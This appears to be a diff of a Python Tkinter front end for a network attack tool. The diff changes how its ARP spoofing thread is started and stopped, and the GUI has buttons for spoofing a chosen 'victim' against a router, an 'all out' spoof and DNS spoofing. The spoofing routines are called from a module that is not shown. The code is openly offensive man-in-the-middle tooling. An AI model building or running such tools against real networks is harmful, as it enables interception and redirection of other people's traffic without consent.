@@ -27,8 +27,8 @@ def get_ips():
     w3["values"] = ipList
 
 
-def spoof(bool, allo):
-    s = bool
+def spoof(so, allo):
+    s = so
     all = allo
     victim = w2.get()
     router = w3.get()
@@ -38,9 +38,12 @@ def spoof(bool, allo):
     if (all != "all out") and s:
         number = int(e.get())
 
-    arps = threading.Thread(target=scan.arp_spoofing, args=(routerMACip[0], routerMACip[1], victimMACip[0], victimMACip[1], s, number, all))
-    arps.start()
-    # scan.arp_spoofing(routerMACip[0], routerMACip[1], victimMACip[0], victimMACip[1], s, number, all)
+    if s:
+        arps = threading.Thread(target=scan.arp_spoofing, args=(routerMACip[0], routerMACip[1], victimMACip[0], victimMACip[1], s, number, all))
+        arps.start()
+    elif not s:
+        scan.put_qu("stop arp")
+        scan.arp_spoofing(routerMACip[0], routerMACip[1], victimMACip[0], victimMACip[1], s, number, all)
 
 
 def dns(start):
@@ -85,7 +88,7 @@ w3.grid(row=3, column=1, columnspan=4)
 spoofbutton = Button(screen, text="Spoof!", command=lambda: spoof(True, "0"))
 spoofbutton.grid(row=4, column=0)
 
-allButton = Button(screen, text="All out spoof!", command = lambda: spoof(True, "all out"))
+allButton = Button(screen, text="All out spoof!", command=lambda: spoof(True, "all out"))
 allButton.grid(row=5, column=0)
 
 e = Entry(screen, state =DISABLED)
@@ -99,8 +102,6 @@ DNSspoofbutton.grid(row=4, column=3)
 
 DNSstopbutton = Button(screen, text="Stop DNS", command=lambda: dns(False))
 DNSstopbutton.grid(row=4, column=4)
-
-
 
 
 screen.mainloop()
